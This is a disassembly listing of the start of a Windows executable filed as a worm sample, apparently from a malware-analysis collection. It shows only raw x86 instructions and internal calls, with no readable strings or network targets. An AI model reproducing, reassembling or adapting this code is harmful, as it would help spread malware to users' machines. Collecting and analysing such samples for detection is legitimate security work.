
malware_samples/worm/b23183f345d29270a5673d5139fe1fe42a34488e70291746eaeb567a4468d2e4.exe:     file format pei-i386


Disassembly of section UPX0:

00401000 <UPX0>:
  401000:	68 c4 00 00 00       	push   $0xc4
  401005:	68 00 00 00 00       	push   $0x0
  40100a:	68 f8 b0 40 00       	push   $0x40b0f8
  40100f:	e8 7c 21 00 00       	call   0x403190
  401014:	83 c4 0c             	add    $0xc,%esp
  401017:	68 00 00 00 00       	push   $0x0
  40101c:	e8 7b 21 00 00       	call   0x40319c
  401021:	a3 fc b0 40 00       	mov    %eax,0x40b0fc
  401026:	68 00 00 00 00       	push   $0x0
  40102b:	68 00 10 00 00       	push   $0x1000
  401030:	68 00 00 00 00       	push   $0x0
  401035:	e8 68 21 00 00       	call   0x4031a2
  40103a:	a3 f8 b0 40 00       	mov    %eax,0x40b0f8
  40103f:	e8 bc 1f 00 00       	call   0x403000
  401044:	e8 27 64 00 00       	call   0x407470
  401049:	e8 b9 57 00 00       	call   0x406807
  40104e:	e8 ed 4f 00 00       	call   0x406040
  401053:	e8 5b 3a 00 00       	call   0x404ab3
  401058:	e8 83 30 00 00       	call   0x4040e0
  40105d:	e8 2e 2d 00 00       	call   0x403d90
  401062:	e8 d4 28 00 00       	call   0x40393b
  401067:	e8 28 26 00 00       	call   0x403694
  40106c:	68 07 00 00 00       	push   $0x7
  401071:	68 88 a3 40 00       	push   $0x40a388
  401076:	8d 05 b8 b1 40 00    	lea    0x40b1b8,%eax
  40107c:	50                   	push   %eax
  40107d:	68 08 00 00 00       	push   $0x8
  401082:	e8 69 2e 00 00       	call   0x403ef0
  401087:	a3 b4 b1 40 00       	mov    %eax,0x40b1b4
  40108c:	68 07 00 00 00       	push   $0x7
  401091:	68 ac b1 40 00       	push   $0x40b1ac
  401096:	68 80 a3 40 00       	push   $0x40a380
  40109b:	8b 15 ac b1 40 00    	mov    0x40b1ac,%edx
  4010a1:	e8 ba 1f 00 00       	call   0x403060
  4010a6:	b8 01 04 00 00       	mov    $0x401,%eax
  4010ab:	68 08 00 00 00       	push   $0x8
  4010b0:	e8 eb 1f 00 00       	call   0x4030a0
  4010b5:	68 00 04 00 00       	push   $0x400
  4010ba:	e8 01 2d 00 00       	call   0x403dc0
  4010bf:	a3 30 b1 40 00       	mov    %eax,0x40b130
  4010c4:	68 08 00 00 00       	push   $0x8
  4010c9:	ff 35 30 b1 40 00    	push   0x40b130
  4010cf:	e8 d4 20 00 00       	call   0x4031a8
  4010d4:	50                   	push   %eax
  4010d5:	e8 d4 20 00 00       	call   0x4031ae
  4010da:	ff 35 30 b1 40 00    	push   0x40b130
  4010e0:	e8 20 6f 00 00       	call   0x408005
  4010e5:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4010ea:	50                   	push   %eax
  4010eb:	50                   	push   %eax
  4010ec:	68 08 00 00 00       	push   $0x8
  4010f1:	ff 35 30 b1 40 00    	push   0x40b130
  4010f7:	e8 e4 2c 00 00       	call   0x403de0
  4010fc:	8d 0d 34 b1 40 00    	lea    0x40b134,%ecx
  401102:	5a                   	pop    %edx
  401103:	e8 e8 1f 00 00       	call   0x4030f0
  401108:	ff 35 30 b1 40 00    	push   0x40b130
  40110e:	e8 1d 2d 00 00       	call   0x403e30
  401113:	ff 35 34 b1 40 00    	push   0x40b134
  401119:	ba 34 a3 40 00       	mov    $0x40a334,%edx
  40111e:	59                   	pop    %ecx
  40111f:	e8 9c 63 00 00       	call   0x4074c0
  401124:	0f 84 d5 00 00 00    	je     0x4011ff
  40112a:	ba 22 a1 40 00       	mov    $0x40a122,%edx
  40112f:	8d 0d 38 b1 40 00    	lea    0x40b138,%ecx
  401135:	e8 ce 1f 00 00       	call   0x403108
  40113a:	ba 78 a0 40 00       	mov    $0x40a078,%edx
  40113f:	8d 0d 3c b1 40 00    	lea    0x40b13c,%ecx
  401145:	e8 be 1f 00 00       	call   0x403108
  40114a:	ba 42 a1 40 00       	mov    $0x40a142,%edx
  40114f:	8d 0d 40 b1 40 00    	lea    0x40b140,%ecx
  401155:	e8 ae 1f 00 00       	call   0x403108
  40115a:	ba 78 a1 40 00       	mov    $0x40a178,%edx
  40115f:	8d 0d 44 b1 40 00    	lea    0x40b144,%ecx
  401165:	e8 9e 1f 00 00       	call   0x403108
  40116a:	ba 1e a2 40 00       	mov    $0x40a21e,%edx
  40116f:	8d 0d 48 b1 40 00    	lea    0x40b148,%ecx
  401175:	e8 8e 1f 00 00       	call   0x403108
  40117a:	ba 13 a1 40 00       	mov    $0x40a113,%edx
  40117f:	8d 0d 4c b1 40 00    	lea    0x40b14c,%ecx
  401185:	e8 7e 1f 00 00       	call   0x403108
  40118a:	ba 07 a3 40 00       	mov    $0x40a307,%edx
  40118f:	8d 0d 50 b1 40 00    	lea    0x40b150,%ecx
  401195:	e8 6e 1f 00 00       	call   0x403108
  40119a:	ba 4e a2 40 00       	mov    $0x40a24e,%edx
  40119f:	8d 0d 54 b1 40 00    	lea    0x40b154,%ecx
  4011a5:	e8 5e 1f 00 00       	call   0x403108
  4011aa:	ba 9e a1 40 00       	mov    $0x40a19e,%edx
  4011af:	8d 0d 58 b1 40 00    	lea    0x40b158,%ecx
  4011b5:	e8 4e 1f 00 00       	call   0x403108
  4011ba:	ba 94 a2 40 00       	mov    $0x40a294,%edx
  4011bf:	8d 0d 5c b1 40 00    	lea    0x40b15c,%ecx
  4011c5:	e8 3e 1f 00 00       	call   0x403108
  4011ca:	ba 3b a0 40 00       	mov    $0x40a03b,%edx
  4011cf:	8d 0d 60 b1 40 00    	lea    0x40b160,%ecx
  4011d5:	e8 2e 1f 00 00       	call   0x403108
  4011da:	ba 15 a2 40 00       	mov    $0x40a215,%edx
  4011df:	8d 0d 64 b1 40 00    	lea    0x40b164,%ecx
  4011e5:	e8 1e 1f 00 00       	call   0x403108
  4011ea:	ba 12 a3 40 00       	mov    $0x40a312,%edx
  4011ef:	8d 0d 68 b1 40 00    	lea    0x40b168,%ecx
  4011f5:	e8 0e 1f 00 00       	call   0x403108
  4011fa:	e9 d0 00 00 00       	jmp    0x4012cf
  4011ff:	ba 2e a1 40 00       	mov    $0x40a12e,%edx
  401204:	8d 0d 38 b1 40 00    	lea    0x40b138,%ecx
  40120a:	e8 f9 1e 00 00       	call   0x403108
  40120f:	ba cc a0 40 00       	mov    $0x40a0cc,%edx
  401214:	8d 0d 3c b1 40 00    	lea    0x40b13c,%ecx
  40121a:	e8 e9 1e 00 00       	call   0x403108
  40121f:	ba e1 a1 40 00       	mov    $0x40a1e1,%edx
  401224:	8d 0d 40 b1 40 00    	lea    0x40b140,%ecx
  40122a:	e8 d9 1e 00 00       	call   0x403108
  40122f:	ba 31 a2 40 00       	mov    $0x40a231,%edx
  401234:	8d 0d 44 b1 40 00    	lea    0x40b144,%ecx
  40123a:	e8 c9 1e 00 00       	call   0x403108
  40123f:	ba f7 a2 40 00       	mov    $0x40a2f7,%edx
  401244:	8d 0d 48 b1 40 00    	lea    0x40b148,%ecx
  40124a:	e8 b9 1e 00 00       	call   0x403108
  40124f:	ba 15 a0 40 00       	mov    $0x40a015,%edx
  401254:	8d 0d 4c b1 40 00    	lea    0x40b14c,%ecx
  40125a:	e8 a9 1e 00 00       	call   0x403108
  40125f:	ba 38 a1 40 00       	mov    $0x40a138,%edx
  401264:	8d 0d 50 b1 40 00    	lea    0x40b150,%ecx
  40126a:	e8 99 1e 00 00       	call   0x403108
  40126f:	ba 41 a3 40 00       	mov    $0x40a341,%edx
  401274:	8d 0d 54 b1 40 00    	lea    0x40b154,%ecx
  40127a:	e8 89 1e 00 00       	call   0x403108
  40127f:	ba 80 a0 40 00       	mov    $0x40a080,%edx
  401284:	8d 0d 58 b1 40 00    	lea    0x40b158,%ecx
  40128a:	e8 79 1e 00 00       	call   0x403108
  40128f:	ba d6 a0 40 00       	mov    $0x40a0d6,%edx
  401294:	8d 0d 5c b1 40 00    	lea    0x40b15c,%ecx
  40129a:	e8 69 1e 00 00       	call   0x403108
  40129f:	ba d2 a2 40 00       	mov    $0x40a2d2,%edx
  4012a4:	8d 0d 60 b1 40 00    	lea    0x40b160,%ecx
  4012aa:	e8 59 1e 00 00       	call   0x403108
  4012af:	ba 0c a2 40 00       	mov    $0x40a20c,%edx
  4012b4:	8d 0d 64 b1 40 00    	lea    0x40b164,%ecx
  4012ba:	e8 49 1e 00 00       	call   0x403108
  4012bf:	ba 20 a0 40 00       	mov    $0x40a020,%edx
  4012c4:	8d 0d 68 b1 40 00    	lea    0x40b168,%ecx
  4012ca:	e8 39 1e 00 00       	call   0x403108
  4012cf:	e8 03 2a 00 00       	call   0x403cd7
  4012d4:	89 c3                	mov    %eax,%ebx
  4012d6:	83 fb 32             	cmp    $0x32,%ebx
  4012d9:	7d 1b                	jge    0x4012f6
  4012db:	68 10 00 00 00       	push   $0x10
  4012e0:	ff 35 5c b1 40 00    	push   0x40b15c
  4012e6:	ff 35 3c b1 40 00    	push   0x40b13c
  4012ec:	e8 b1 23 00 00       	call   0x4036a2
  4012f1:	e9 a9 08 00 00       	jmp    0x401b9f
  4012f6:	8d 05 8e 20 40 00    	lea    0x40208e,%eax
  4012fc:	50                   	push   %eax
  4012fd:	e8 6e 28 00 00       	call   0x403b70
  401302:	e8 5f 27 00 00       	call   0x403a66
  401307:	a3 70 b1 40 00       	mov    %eax,0x40b170
  40130c:	68 00 00 00 00       	push   $0x0
  401311:	e8 86 1e 00 00       	call   0x40319c
  401316:	a3 74 b1 40 00       	mov    %eax,0x40b174
  40131b:	8b 1d 70 b1 40 00    	mov    0x40b170,%ebx
  401321:	21 db                	and    %ebx,%ebx
  401323:	7e 65                	jle    0x40138a
  401325:	c7 05 78 b1 40 00 00 	movl   $0x0,0x40b178
  40132c:	00 00 00 
  40132f:	8b 1d 70 b1 40 00    	mov    0x40b170,%ebx
  401335:	4b                   	dec    %ebx
  401336:	3b 1d 78 b1 40 00    	cmp    0x40b178,%ebx
  40133c:	7c 4c                	jl     0x40138a
  40133e:	8b 15 7c b1 40 00    	mov    0x40b17c,%edx
  401344:	ff 35 b0 b3 40 00    	push   0x40b3b0
  40134a:	e8 a1 61 00 00       	call   0x4074f0
  40134f:	ba 11 a0 40 00       	mov    $0x40a011,%edx
  401354:	e8 97 61 00 00       	call   0x4074f0
  401359:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  40135e:	50                   	push   %eax
  40135f:	50                   	push   %eax
  401360:	ff 35 78 b1 40 00    	push   0x40b178
  401366:	e8 ad 26 00 00       	call   0x403a18
  40136b:	58                   	pop    %eax
  40136c:	ba d3 a0 40 00       	mov    $0x40a0d3,%edx
  401371:	e8 7a 61 00 00       	call   0x4074f0
  401376:	8d 0d 7c b1 40 00    	lea    0x40b17c,%ecx
  40137c:	5a                   	pop    %edx
  40137d:	e8 6e 1d 00 00       	call   0x4030f0
  401382:	ff 05 78 b1 40 00    	incl   0x40b178
  401388:	eb a5                	jmp    0x40132f
  40138a:	68 c6 a0 40 00       	push   $0x40a0c6
  40138f:	ff 35 74 b1 40 00    	push   0x40b174
  401395:	e8 17 0d 00 00       	call   0x4020b1
  40139a:	21 c0                	and    %eax,%eax
  40139c:	74 17                	je     0x4013b5
  40139e:	a1 30 b1 40 00       	mov    0x40b130,%eax
  4013a3:	a3 80 b1 40 00       	mov    %eax,0x40b180
  4013a8:	ff 35 80 b1 40 00    	push   0x40b180
  4013ae:	e8 2a 08 00 00       	call   0x401bdd
  4013b3:	eb 20                	jmp    0x4013d5
  4013b5:	68 10 00 00 00       	push   $0x10
  4013ba:	ff 35 58 b1 40 00    	push   0x40b158
  4013c0:	ff 35 3c b1 40 00    	push   0x40b13c
  4013c6:	e8 d7 22 00 00       	call   0x4036a2
  4013cb:	68 01 00 00 00       	push   $0x1
  4013d0:	e9 cf 07 00 00       	jmp    0x401ba4
  4013d5:	68 c4 a0 40 00       	push   $0x40a0c4
  4013da:	ff 35 74 b1 40 00    	push   0x40b174
  4013e0:	e8 cc 0c 00 00       	call   0x4020b1
  4013e5:	21 c0                	and    %eax,%eax
  4013e7:	74 26                	je     0x40140f
  4013e9:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4013ee:	50                   	push   %eax
  4013ef:	50                   	push   %eax
  4013f0:	ff 35 6c b1 40 00    	push   0x40b16c
  4013f6:	ff 35 30 b1 40 00    	push   0x40b130
  4013fc:	e8 df 29 00 00       	call   0x403de0
  401401:	8d 0d 84 b1 40 00    	lea    0x40b184,%ecx
  401407:	5a                   	pop    %edx
  401408:	e8 e3 1c 00 00       	call   0x4030f0
  40140d:	eb 20                	jmp    0x40142f
  40140f:	68 10 00 00 00       	push   $0x10
  401414:	ff 35 58 b1 40 00    	push   0x40b158
  40141a:	ff 35 3c b1 40 00    	push   0x40b13c
  401420:	e8 7d 22 00 00       	call   0x4036a2
  401425:	68 01 00 00 00       	push   $0x1
  40142a:	e9 75 07 00 00       	jmp    0x401ba4
  40142f:	68 bc a0 40 00       	push   $0x40a0bc
  401434:	ff 35 74 b1 40 00    	push   0x40b174
  40143a:	e8 72 0c 00 00       	call   0x4020b1
  40143f:	21 c0                	and    %eax,%eax
  401441:	74 20                	je     0x401463
  401443:	a1 30 b1 40 00       	mov    0x40b130,%eax
  401448:	a3 88 b1 40 00       	mov    %eax,0x40b188
  40144d:	a1 6c b1 40 00       	mov    0x40b16c,%eax
  401452:	a3 10 b1 40 00       	mov    %eax,0x40b110
  401457:	a1 88 b1 40 00       	mov    0x40b188,%eax
  40145c:	a3 04 b1 40 00       	mov    %eax,0x40b104
  401461:	eb 20                	jmp    0x401483
  401463:	68 10 00 00 00       	push   $0x10
  401468:	ff 35 58 b1 40 00    	push   0x40b158
  40146e:	ff 35 3c b1 40 00    	push   0x40b13c
  401474:	e8 29 22 00 00       	call   0x4036a2
  401479:	68 01 00 00 00       	push   $0x1
  40147e:	e9 21 07 00 00       	jmp    0x401ba4
  401483:	68 c2 a0 40 00       	push   $0x40a0c2
  401488:	ff 35 74 b1 40 00    	push   0x40b174
  40148e:	e8 1e 0c 00 00       	call   0x4020b1
  401493:	21 c0                	and    %eax,%eax
  401495:	74 1e                	je     0x4014b5
  401497:	a1 30 b1 40 00       	mov    0x40b130,%eax
  40149c:	a3 8c b1 40 00       	mov    %eax,0x40b18c
  4014a1:	a1 6c b1 40 00       	mov    0x40b16c,%eax
  4014a6:	a3 14 b1 40 00       	mov    %eax,0x40b114
  4014ab:	a1 8c b1 40 00       	mov    0x40b18c,%eax
  4014b0:	a3 08 b1 40 00       	mov    %eax,0x40b108
  4014b5:	68 c0 a0 40 00       	push   $0x40a0c0
  4014ba:	ff 35 74 b1 40 00    	push   0x40b174
  4014c0:	e8 ec 0b 00 00       	call   0x4020b1
  4014c5:	21 c0                	and    %eax,%eax
  4014c7:	74 1e                	je     0x4014e7
  4014c9:	a1 30 b1 40 00       	mov    0x40b130,%eax
  4014ce:	a3 90 b1 40 00       	mov    %eax,0x40b190
  4014d3:	a1 6c b1 40 00       	mov    0x40b16c,%eax
  4014d8:	a3 18 b1 40 00       	mov    %eax,0x40b118
  4014dd:	a1 90 b1 40 00       	mov    0x40b190,%eax
  4014e2:	a3 0c b1 40 00       	mov    %eax,0x40b10c
  4014e7:	68 c8 a0 40 00       	push   $0x40a0c8
  4014ec:	ff 35 74 b1 40 00    	push   0x40b174
  4014f2:	e8 ba 0b 00 00       	call   0x4020b1
  4014f7:	21 c0                	and    %eax,%eax
  4014f9:	0f 84 57 02 00 00    	je     0x401756
  4014ff:	68 01 00 c8 00       	push   $0xc80001
  401504:	ff 35 64 b1 40 00    	push   0x40b164
  40150a:	68 6e 00 00 00       	push   $0x6e
  40150f:	68 c8 00 00 00       	push   $0xc8
  401514:	68 00 00 00 00       	push   $0x0
  401519:	68 00 00 00 00       	push   $0x0
  40151e:	68 00 00 00 00       	push   $0x0
  401523:	e8 be 38 00 00       	call   0x404de6
  401528:	ff 35 68 b1 40 00    	push   0x40b168
  40152e:	68 14 00 00 00       	push   $0x14
  401533:	68 9e 00 00 00       	push   $0x9e
  401538:	68 0f 00 00 00       	push   $0xf
  40153d:	68 15 00 00 00       	push   $0x15
  401542:	68 01 00 00 00       	push   $0x1
  401547:	e8 71 2d 00 00       	call   0x4042bd
  40154c:	68 20 00 00 00       	push   $0x20
  401551:	68 0d a0 40 00       	push   $0x40a00d
  401556:	68 14 00 00 00       	push   $0x14
  40155b:	68 9e 00 00 00       	push   $0x9e
  401560:	68 28 00 00 00       	push   $0x28
  401565:	68 15 00 00 00       	push   $0x15
  40156a:	68 02 00 00 00       	push   $0x2
  40156f:	e8 3a 2e 00 00       	call   0x4043ae
  401574:	68 91 a2 40 00       	push   $0x40a291
  401579:	68 14 00 00 00       	push   $0x14
  40157e:	68 4e 00 00 00       	push   $0x4e
  401583:	68 4b 00 00 00       	push   $0x4b
  401588:	68 3d 00 00 00       	push   $0x3d
  40158d:	68 03 00 00 00       	push   $0x3
  401592:	e8 1c 30 00 00       	call   0x4045b3
  401597:	68 04 00 00 00       	push   $0x4
  40159c:	68 0d 00 00 00       	push   $0xd
  4015a1:	68 00 00 00 00       	push   $0x0
  4015a6:	e8 5e 38 00 00       	call   0x404e09
  4015ab:	68 02 00 00 00       	push   $0x2
  4015b0:	e8 1e 30 00 00       	call   0x4045d3
  4015b5:	e8 a4 3a 00 00       	call   0x40505e
  4015ba:	50                   	push   %eax
  4015bb:	bb 10 00 00 00       	mov    $0x10,%ebx
  4015c0:	3b 1c 24             	cmp    (%esp),%ebx
  4015c3:	75 1d                	jne    0x4015e2
  4015c5:	ff 35 2c b1 40 00    	push   0x40b12c
  4015cb:	e8 c6 1b 00 00       	call   0x403196
  4015d0:	83 c4 04             	add    $0x4,%esp
  4015d3:	68 00 00 00 00       	push   $0x0
  4015d8:	e9 c7 05 00 00       	jmp    0x401ba4
  4015dd:	e9 90 00 00 00       	jmp    0x401672
  4015e2:	bb 2d 33 00 00       	mov    $0x332d,%ebx
  4015e7:	3b 1c 24             	cmp    (%esp),%ebx
  4015ea:	75 3f                	jne    0x40162b
  4015ec:	e8 75 3a 00 00       	call   0x405066
  4015f1:	50                   	push   %eax
  4015f2:	bb 04 00 00 00       	mov    $0x4,%ebx
  4015f7:	3b 1c 24             	cmp    (%esp),%ebx
  4015fa:	75 2c                	jne    0x401628
  4015fc:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401601:	50                   	push   %eax
  401602:	50                   	push   %eax
  401603:	68 02 00 00 00       	push   $0x2
  401608:	e8 ef 2f 00 00       	call   0x4045fc
  40160d:	8d 0d 94 b1 40 00    	lea    0x40b194,%ecx
  401613:	5a                   	pop    %edx
  401614:	e8 d7 1a 00 00       	call   0x4030f0
  401619:	68 00 00 00 00       	push   $0x0
  40161e:	e8 02 33 00 00       	call   0x404925
  401623:	83 c4 08             	add    $0x8,%esp
  401626:	eb 50                	jmp    0x401678
  401628:	58                   	pop    %eax
  401629:	eb 47                	jmp    0x401672
  40162b:	bb 2c 33 00 00       	mov    $0x332c,%ebx
  401630:	3b 1c 24             	cmp    (%esp),%ebx
  401633:	75 3d                	jne    0x401672
  401635:	e8 3a 3a 00 00       	call   0x405074
  40163a:	50                   	push   %eax
  40163b:	bb 03 00 00 00       	mov    $0x3,%ebx
  401640:	3b 1c 24             	cmp    (%esp),%ebx
  401643:	75 2c                	jne    0x401671
  401645:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  40164a:	50                   	push   %eax
  40164b:	50                   	push   %eax
  40164c:	68 02 00 00 00       	push   $0x2
  401651:	e8 a6 2f 00 00       	call   0x4045fc
  401656:	8d 0d 94 b1 40 00    	lea    0x40b194,%ecx
  40165c:	5a                   	pop    %edx
  40165d:	e8 8e 1a 00 00       	call   0x4030f0
  401662:	68 00 00 00 00       	push   $0x0
  401667:	e8 b9 32 00 00       	call   0x404925
  40166c:	83 c4 08             	add    $0x8,%esp
  40166f:	eb 07                	jmp    0x401678
  401671:	58                   	pop    %eax
  401672:	58                   	pop    %eax
  401673:	e9 3d ff ff ff       	jmp    0x4015b5
  401678:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  40167d:	50                   	push   %eax
  40167e:	50                   	push   %eax
  40167f:	ff 35 94 b1 40 00    	push   0x40b194
  401685:	e8 66 1b 00 00       	call   0x4031f0
  40168a:	50                   	push   %eax
  40168b:	a1 94 b1 40 00       	mov    0x40b194,%eax
  401690:	50                   	push   %eax
  401691:	e8 ca 51 00 00       	call   0x406860
  401696:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  40169c:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4016a1:	50                   	push   %eax
  4016a2:	50                   	push   %eax
  4016a3:	ff 35 6c b1 40 00    	push   0x40b16c
  4016a9:	ff 35 30 b1 40 00    	push   0x40b130
  4016af:	e8 2c 27 00 00       	call   0x403de0
  4016b4:	5a                   	pop    %edx
  4016b5:	59                   	pop    %ecx
  4016b6:	89 0d b0 b3 40 00    	mov    %ecx,0x40b3b0
  4016bc:	03 0d 90 a3 40 00    	add    0x40a390,%ecx
  4016c2:	03 15 90 a3 40 00    	add    0x40a390,%edx
  4016c8:	e8 f3 5d 00 00       	call   0x4074c0
  4016cd:	75 2e                	jne    0x4016fd
  4016cf:	68 10 00 00 00       	push   $0x10
  4016d4:	ff 35 48 b1 40 00    	push   0x40b148
  4016da:	ff 35 3c b1 40 00    	push   0x40b13c
  4016e0:	e8 bd 1f 00 00       	call   0x4036a2
  4016e5:	ff 35 2c b1 40 00    	push   0x40b12c
  4016eb:	e8 a6 1a 00 00       	call   0x403196
  4016f0:	83 c4 04             	add    $0x4,%esp
  4016f3:	68 01 00 00 00       	push   $0x1
  4016f8:	e9 a7 04 00 00       	jmp    0x401ba4
  4016fd:	68 ca a0 40 00       	push   $0x40a0ca
  401702:	ff 35 74 b1 40 00    	push   0x40b174
  401708:	e8 a4 09 00 00       	call   0x4020b1
  40170d:	21 c0                	and    %eax,%eax
  40170f:	74 0a                	je     0x40171b
  401711:	a1 30 b1 40 00       	mov    0x40b130,%eax
  401716:	a3 98 b1 40 00       	mov    %eax,0x40b198
  40171b:	ff 35 18 b1 40 00    	push   0x40b118
  401721:	ff 35 14 b1 40 00    	push   0x40b114
  401727:	ff 35 10 b1 40 00    	push   0x40b110
  40172d:	ff 35 98 b1 40 00    	push   0x40b198
  401733:	ff 35 90 b1 40 00    	push   0x40b190
  401739:	ff 35 8c b1 40 00    	push   0x40b18c
  40173f:	ff 35 88 b1 40 00    	push   0x40b188
  401745:	ff 35 94 b1 40 00    	push   0x40b194
  40174b:	ff 35 74 b1 40 00    	push   0x40b174
  401751:	e8 e9 05 00 00       	call   0x401d3f
  401756:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  40175b:	50                   	push   %eax
  40175c:	50                   	push   %eax
  40175d:	ff 35 10 b1 40 00    	push   0x40b110
  401763:	ff 35 04 b1 40 00    	push   0x40b104
  401769:	e8 72 26 00 00       	call   0x403de0
  40176e:	8d 0d 9c b1 40 00    	lea    0x40b19c,%ecx
  401774:	5a                   	pop    %edx
  401775:	e8 76 19 00 00       	call   0x4030f0
  40177a:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  40177f:	50                   	push   %eax
  401780:	50                   	push   %eax
  401781:	ff 35 14 b1 40 00    	push   0x40b114
  401787:	ff 35 08 b1 40 00    	push   0x40b108
  40178d:	e8 4e 26 00 00       	call   0x403de0
  401792:	8d 0d a0 b1 40 00    	lea    0x40b1a0,%ecx
  401798:	5a                   	pop    %edx
  401799:	e8 52 19 00 00       	call   0x4030f0
  40179e:	68 be a0 40 00       	push   $0x40a0be
  4017a3:	ff 35 74 b1 40 00    	push   0x40b174
  4017a9:	e8 03 09 00 00       	call   0x4020b1
  4017ae:	21 c0                	and    %eax,%eax
  4017b0:	0f 84 6f 02 00 00    	je     0x401a25
  4017b6:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4017bb:	50                   	push   %eax
  4017bc:	50                   	push   %eax
  4017bd:	68 00 00 00 00       	push   $0x0
  4017c2:	e8 51 22 00 00       	call   0x403a18
  4017c7:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  4017cd:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4017d2:	50                   	push   %eax
  4017d3:	50                   	push   %eax
  4017d4:	ff 35 6c b1 40 00    	push   0x40b16c
  4017da:	ff 35 30 b1 40 00    	push   0x40b130
  4017e0:	e8 fb 25 00 00       	call   0x403de0
  4017e5:	5a                   	pop    %edx
  4017e6:	59                   	pop    %ecx
  4017e7:	89 0d b0 b3 40 00    	mov    %ecx,0x40b3b0
  4017ed:	03 0d 90 a3 40 00    	add    0x40a390,%ecx
  4017f3:	03 15 90 a3 40 00    	add    0x40a390,%edx
  4017f9:	e8 c2 5c 00 00       	call   0x4074c0
  4017fe:	74 12                	je     0x401812
  401800:	8b 1d 70 b1 40 00    	mov    0x40b170,%ebx
  401806:	83 fb 01             	cmp    $0x1,%ebx
  401809:	75 07                	jne    0x401812
  40180b:	b8 01 00 00 00       	mov    $0x1,%eax
  401810:	eb 02                	jmp    0x401814
  401812:	31 c0                	xor    %eax,%eax
  401814:	21 c0                	and    %eax,%eax
  401816:	0f 84 09 02 00 00    	je     0x401a25
  40181c:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401821:	50                   	push   %eax
  401822:	50                   	push   %eax
  401823:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401828:	50                   	push   %eax
  401829:	50                   	push   %eax
  40182a:	e8 a6 45 00 00       	call   0x405dd5
  40182f:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  401835:	ff 35 60 b1 40 00    	push   0x40b160
  40183b:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  401841:	01 54 24 04          	add    %edx,0x4(%esp)
  401845:	e8 ae 1e 00 00       	call   0x4036f8
  40184a:	8d 0d a4 b1 40 00    	lea    0x40b1a4,%ecx
  401850:	5a                   	pop    %edx
  401851:	e8 9a 18 00 00       	call   0x4030f0
  401856:	8b 15 a4 b1 40 00    	mov    0x40b1a4,%edx
  40185c:	31 c9                	xor    %ecx,%ecx
  40185e:	e8 5d 5c 00 00       	call   0x4074c0
  401863:	0f 85 5d 01 00 00    	jne    0x4019c6
  401869:	8b 15 a4 b1 40 00    	mov    0x40b1a4,%edx
  40186f:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401875:	e8 76 5c 00 00       	call   0x4074f0
  40187a:	8d 0d 24 b1 40 00    	lea    0x40b124,%ecx
  401880:	5a                   	pop    %edx
  401881:	e8 6a 18 00 00       	call   0x4030f0
  401886:	8b 15 a0 b1 40 00    	mov    0x40b1a0,%edx
  40188c:	31 c9                	xor    %ecx,%ecx
  40188e:	e8 2d 5c 00 00       	call   0x4074c0
  401893:	75 0b                	jne    0x4018a0
  401895:	ff 35 a0 b1 40 00    	push   0x40b1a0
  40189b:	e8 78 08 00 00       	call   0x402118
  4018a0:	ff 35 84 b1 40 00    	push   0x40b184
  4018a6:	68 01 00 00 00       	push   $0x1
  4018ab:	e8 80 49 00 00       	call   0x406230
  4018b0:	21 c0                	and    %eax,%eax
  4018b2:	0f 84 e0 00 00 00    	je     0x401998
  4018b8:	68 01 00 00 00       	push   $0x1
  4018bd:	e8 0e 47 00 00       	call   0x405fd0
  4018c2:	ff 35 b0 b3 40 00    	push   0x40b3b0
  4018c8:	68 24 00 00 00       	push   $0x24
  4018cd:	8b 15 50 b1 40 00    	mov    0x40b150,%edx
  4018d3:	ff 35 b0 b3 40 00    	push   0x40b3b0
  4018d9:	e8 12 5c 00 00       	call   0x4074f0
  4018de:	ba 11 a0 40 00       	mov    $0x40a011,%edx
  4018e3:	e8 08 5c 00 00       	call   0x4074f0
  4018e8:	8b 15 84 b1 40 00    	mov    0x40b184,%edx
  4018ee:	e8 fd 5b 00 00       	call   0x4074f0
  4018f3:	ba 11 a0 40 00       	mov    $0x40a011,%edx
  4018f8:	e8 f3 5b 00 00       	call   0x4074f0
  4018fd:	8b 15 54 b1 40 00    	mov    0x40b154,%edx
  401903:	e8 e8 5b 00 00       	call   0x4074f0
  401908:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  40190e:	ff 35 4c b1 40 00    	push   0x40b14c
  401914:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  40191a:	01 54 24 04          	add    %edx,0x4(%esp)
  40191e:	e8 7f 1d 00 00       	call   0x4036a2
  401923:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  401929:	a3 a8 b1 40 00       	mov    %eax,0x40b1a8
  40192e:	8b 1d a8 b1 40 00    	mov    0x40b1a8,%ebx
  401934:	83 fb 07             	cmp    $0x7,%ebx
  401937:	75 5f                	jne    0x401998
  401939:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  40193e:	50                   	push   %eax
  40193f:	50                   	push   %eax
  401940:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401945:	50                   	push   %eax
  401946:	50                   	push   %eax
  401947:	ff 35 b0 b3 40 00    	push   0x40b3b0
  40194d:	e8 27 21 00 00       	call   0x403a79
  401952:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  401958:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  40195e:	01 14 24             	add    %edx,(%esp)
  401961:	e8 af 44 00 00       	call   0x405e15
  401966:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  40196c:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  401972:	01 14 24             	add    %edx,(%esp)
  401975:	e8 16 45 00 00       	call   0x405e90
  40197a:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  401980:	ff 35 2c b1 40 00    	push   0x40b12c
